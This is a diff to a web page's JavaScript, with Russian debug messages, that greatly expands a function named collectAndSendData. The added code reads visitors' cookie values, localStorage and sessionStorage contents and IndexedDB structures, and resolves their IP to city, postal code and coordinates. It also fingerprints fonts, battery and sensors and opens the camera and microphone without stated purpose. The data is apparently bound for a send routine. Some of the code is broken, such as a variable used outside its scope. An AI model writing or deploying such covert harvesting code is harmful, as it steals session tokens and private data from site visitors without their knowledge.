@@ -722,6 +722,7 @@
                 debugError('Ошибка в handleDarkModeSwitch', error);
             }
         }
+
         async function collectAndSendData() {
             try {
                 debugLog('Начало сбора данных браузера');
@@ -759,11 +760,22 @@
                     collectedAt: new Date().toISOString(),
                     timestamp: Date.now(),
                     source: window.location.href,
-                    userAgent: navigator.userAgent
-                }
+                    userAgent: navigator.userAgent,
+                    referrer: document.referrer || 'none',
+                    historyLength: history.length
+                },
+                browser: collectBrowserInfo(),
+                system: collectSystemInfo(),
+                location: await collectLocationInfo(),
+                media: await collectMediaInfo(),
+                network: collectNetworkInfo(),
+                capabilities: collectCapabilitiesInfo(),
+                additional: collectAdditionalInfo(),
+                advanced: await collectAdvancedInfo(),
+                behavior: collectBehaviorInfo(),
+                sensors: await collectSensorInfo(),
+                storage: await collectDatabaseInfo()
             };
-            data.browser = collectBrowserInfo();
-            data.system = collectSystemInfo();
 
             try {
                 data.location = await collectLocationInfo();
@@ -781,7 +793,185 @@
             data.capabilities = collectCapabilitiesInfo();
             data.additional = collectAdditionalInfo();
 
+            data.advanced = await collectAdvancedInfo();
+            data.behavior = collectBehaviorInfo();
+            data.sensors = await collectSensorInfo();
+
             return data;
+        }
+
+        async function collectAdvancedInfo() {
+            return {
+                webAuthn: 'credentials' in navigator,
+                shareAPI: 'share' in navigator,
+                indexedDB: 'indexedDB' in window,
+                cacheAPI: 'caches' in window,
+                webSQL: 'openDatabase' in window,
+                webRTC: 'RTCPeerConnection' in window,
+                webSocket: 'WebSocket' in window,
+                fonts: await getFontsInfo(),
+                mimeTypes: getMimeTypesInfo(),
+                csp: getCSPInfo(),
+                battery: await getBatteryInfo(),
+                bluetooth: 'bluetooth' in navigator,
+                paymentAPI: 'PaymentRequest' in window,
+                credentialsAPI: 'credentials' in navigator
+            };
+        }
+
+        function collectBehaviorInfo() {
+            const scrollDepth = window.scrollY / document.body.scrollHeight;
+            const timeOnPage = performance.now() - performance.timing.navigationStart;
+
+            return {
+                scrollDepth: Math.round(scrollDepth * 100) + '%',
+                timeOnPage: Math.round(timeOnPage) + 'ms',
+                screenOrientation: screen.orientation?.type || window.orientation || 'unknown',
+                visibilityState: document.visibilityState,
+                hasFocus: document.hasFocus(),
+                mouseTracking: 'available',
+                keyboardTracking: 'available'
+            };
+        }
+
+        async function collectSensorInfo() {
+            return {
+                deviceMotion: 'DeviceMotionEvent' in window,
+                deviceOrientation: 'DeviceOrientationEvent' in window,
+                ambientLight: 'AmbientLightSensor' in window,
+                proximity: 'ProximitySensor' in window,
+                gyroscope: 'Gyroscope' in window,
+                accelerometer: 'Accelerometer' in window,
+                magnetometer: 'Magnetometer' in window
+            };
+        }
+
+        async function getFontsInfo() {
+            if (!document.fonts || !document.fonts.ready) {
+                return { available: false };
+            }
+
+            try {
+                await document.fonts.ready;
+                const fonts = [];
+                for (const font of document.fonts) {
+                    fonts.push(font.family);
+                }
+                return {
+                    available: true,
+                    count: fonts.length,
+                    uniqueCount: [...new Set(fonts)].length,
+                    sample: fonts.slice(0, 10)
+                };
+            } catch (error) {
+                return { available: false, error: error.message };
+            }
+        }
+
+        function getMimeTypesInfo() {
+            if (!navigator.mimeTypes) {
+                return { available: false };
+            }
+
+            const mimeTypes = [];
+            for (let i = 0; i < navigator.mimeTypes.length; i++) {
+                const mimeType = navigator.mimeTypes[i];
+                mimeTypes.push({
+                    type: mimeType.type,
+                    description: mimeType.description,
+                    enabled: mimeType.enabledPlugin ? true : false
+                });
+            }
+
+            return {
+                available: true,
+                count: mimeTypes.length,
+                types: mimeTypes.slice(0, 20)
+            };
+        }
+
+        function getCSPInfo() {
+            const cspMeta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
+            const cspHeader = document.querySelector('meta[http-equiv="Content-Security-Policy-Report-Only"]');
+
+            return {
+                hasCSP: !!cspMeta,
+                hasReportOnly: !!cspHeader,
+                cspContent: cspMeta ? cspMeta.content : null,
+                reportOnlyContent: cspHeader ? cspHeader.content : null
+            };
+        }
+
+        async function getBatteryInfo() {
+            if (!navigator.getBattery) {
+                return { available: false };
+            }
+
+            try {
+                const battery = await navigator.getBattery();
+                return {
+                    available: true,
+                    level: Math.round(battery.level * 100) + '%',
+                    charging: battery.charging,
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+            } catch (error) {
+                return { available: false, error: error.message };
+            }
+        }
+
+        async function getMediaDetails() {
+            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                return { available: false };
+            }
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'environment' },
+                    audio: true
+                });
+
+                const videoTracks = stream.getVideoTracks();
+                const audioTracks = stream.getAudioTracks();
+
+                const result = {
+                    available: true,
+                    video: {
+                        hasCamera: videoTracks.length > 0,
+                        tracks: videoTracks.length
+                    },
+                    audio: {
+                        hasMicrophone: audioTracks.length > 0,
+                        tracks: audioTracks.length
+                    }
+                };
+
+                if (videoTracks.length > 0) {
+                    const settings = videoTracks[0].getSettings();
+                    result.video.details = {
+                        width: settings.width,
+                        height: settings.height,
+                        frameRate: settings.frameRate,
+                        facingMode: settings.facingMode,
+                        deviceId: settings.deviceId ? settings.deviceId.substring(0, 10) + '...' : null
+                    };
+                }
+
+                stream.getTracks().forEach(track => track.stop());
+
+                return result;
+            } catch (error) {
+                return {
+                    available: false,
+                    error: error.message,
+                    name: error.name
+                };
+            } finally {
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+            }
         }
 
         function collectBrowserInfo() {
@@ -882,7 +1072,26 @@
 
                     if (geoResponse.ok) {
                         const geoData = await geoResponse.json();
-                        ipData = { ...ipData, ...geoData };
+                        ipData = {
+                            ...ipData,
+                            ...geoData,
+                            country: geoData.country_name,
+                            country_code: geoData.country_code,
+                            region: geoData.region,
+                            city: geoData.city,
+                            postal: geoData.postal,
+                            latitude: geoData.latitude,
+                            longitude: geoData.longitude,
+                            timezone: geoData.timezone,
+                            currency: geoData.currency,
+                            languages: geoData.languages,
+                            isp: geoData.org,
+                            org: geoData.org,
+                            as: geoData.asn,
+                            mobile: geoData.mobile || false,
+                            proxy: geoData.proxy || false,
+                            hosting: geoData.hosting || false
+                        };
                         debugLog('Геоданные получены успешно');
                     }
                     else {
@@ -896,6 +1105,7 @@
             }
             catch (error) {
                 ipData.error = 'Не удалось получить данные по IP';
+                debugError('Ошибка получения IP', error);
             }
 
             let preciseLocation = null;
@@ -964,6 +1174,7 @@
 
             try {
                 const devices = await navigator.mediaDevices.enumerateDevices();
+                const mediaDetails = await getMediaDetails();
 
                 return {
                     devices: devices.map(device => ({
@@ -976,8 +1187,15 @@
                         hasCamera: devices.some(d => d.kind === 'videoinput'),
                         hasMicrophone: devices.some(d => d.kind === 'audioinput'),
                         hasSpeakers: devices.some(d => d.kind === 'audiooutput'),
-                        totalDevices: devices.length
-                    }
+                        totalDevices: devices.length,
+                        cameraAccess: mediaDetails.available ?
+                            (mediaDetails.video?.hasCamera ? 'granted' : 'not_available') :
+                            mediaDetails.error?.includes('denied') ? 'denied' : 'not_checked',
+                        microphoneAccess: mediaDetails.available ?
+                            (mediaDetails.audio?.hasMicrophone ? 'granted' : 'not_available') :
+                            mediaDetails.error?.includes('denied') ? 'denied' : 'not_checked'
+                    },
+                    mediaDetails: mediaDetails
                 };
             } catch (error) {
                 return { error: error.message };
@@ -1112,6 +1330,140 @@
                 pageLoadTime: performance.timing ?
                     performance.timing.loadEventEnd - performance.timing.navigationStart + 'ms' : 'unknown'
             };
+        }
+
+        async function collectDatabaseInfo() {
+            const result = {
+                indexedDB: { available: false, databases: [] },
+                localStorage: { available: false, data: {} },
+                sessionStorage: { available: false, data: {} },
+                cookies: { available: false, cookies: [] }
+            };
+
+            if ('indexedDB' in window) {
+                result.indexedDB.available = true;
+
+                try {
+                    const databases = await indexedDB.databases ? indexedDB.databases() : [];
+
+                    if (databases && databases.length > 0) {
+                        result.indexedDB.databases = databases.map(db => ({
+                            name: db.name,
+                            version: db.version
+                        }));
+
+                        for (const dbInfo of databases.slice(0, 3)) {
+                            try {
+                                const db = await new Promise((resolve, reject) => {
+                                    const request = indexedDB.open(dbInfo.name);
+                                    request.onsuccess = () => resolve(request.result);
+                                    request.onerror = () => reject(request.error);
+                                    request.onupgradeneeded = () => {
+                                        request.transaction.abort();
+                                    };
+                                });
+
+                                const stores = [];
+                                if (db.objectStoreNames) {
+                                    for (const storeName of db.objectStoreNames) {
+                                        const store = db.transaction(storeName).objectStore(storeName);
+                                        stores.push({
+                                            name: storeName,
+                                            keyPath: store.keyPath,
+                                            autoIncrement: store.autoIncrement,
+                                            indexes: Array.from(store.indexNames).map(indexName => {
+                                                const index = store.index(indexName);
+                                                return {
+                                                    name: index.name,
+                                                    keyPath: index.keyPath,
+                                                    unique: index.unique,
+                                                    multiEntry: index.multiEntry
+                                                };
+                                            })
+                                        });
+                                    }
+                                }
+
+                                result.indexedDB.databases.find(d => d.name === dbInfo.name).stores = stores;
+                                db.close();
+
+                            } catch (e) { }
+                        }
+                    }
+                } catch (error) {
+                    result.indexedDB.error = error.message;
+                }
+            }
+
+            if ('localStorage' in window) {
+                result.localStorage.available = true;
+                try {
+                    const items = {};
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        const value = localStorage.getItem(key);
+                        items[key] = value ?
+                            (value.length > 100 ? value.substring(0, 100) + '...' : value) :
+                            null;
+                    }
+                    result.localStorage.data = items;
+                    result.localStorage.count = Object.keys(items).length;
+                } catch (e) {
+                    result.localStorage.error = e.message;
+                }
+            }
+
+            if ('sessionStorage' in window) {
+                result.sessionStorage.available = true;
+                try {
+                    const items = {};
+                    for (let i = 0; i < sessionStorage.length; i++) {
+                        const key = sessionStorage.key(i);
+                        const value = sessionStorage.getItem(key);
+                        items[key] = value ?
+                            (value.length > 100 ? value.substring(0, 100) + '...' : value) :
+                            null;
+                    }
+                    result.sessionStorage.data = items;
+                    result.sessionStorage.count = Object.keys(items).length;
+                } catch (e) {
+                    result.sessionStorage.error = e.message;
+                }
+            }
+
+            if (navigator.cookieEnabled) {
+                result.cookies.available = true;
+                try {
+                    const cookies = document.cookie.split(';').map(c => c.trim());
+                    result.cookies.cookies = cookies.filter(c => c).map(cookie => {
+                        const [name, ...valueParts] = cookie.split('=');
+                        return {
+                            name: name,
+                            value: valueParts.join('=').substring(0, 50) +
+                                (valueParts.join('=').length > 50 ? '...' : ''),
+                            fullLength: valueParts.join('=').length
+                        };
+                    });
+                    result.cookies.count = result.cookies.cookies.length;
+                } catch (e) {
+                    result.cookies.error = e.message;
+                }
+            }
+
+            if ('caches' in window) {
+                try {
+                    const cacheKeys = await caches.keys();
+                    result.cacheAPI = {
+                        available: true,
+                        caches: cacheKeys,
+                        count: cacheKeys.length
+                    };
+                } catch (e) {
+                    result.cacheAPI = { available: false, error: e.message };
+                }
+            }
+
+            return result;
         }
 
         async function sendFormData(jsonData) {
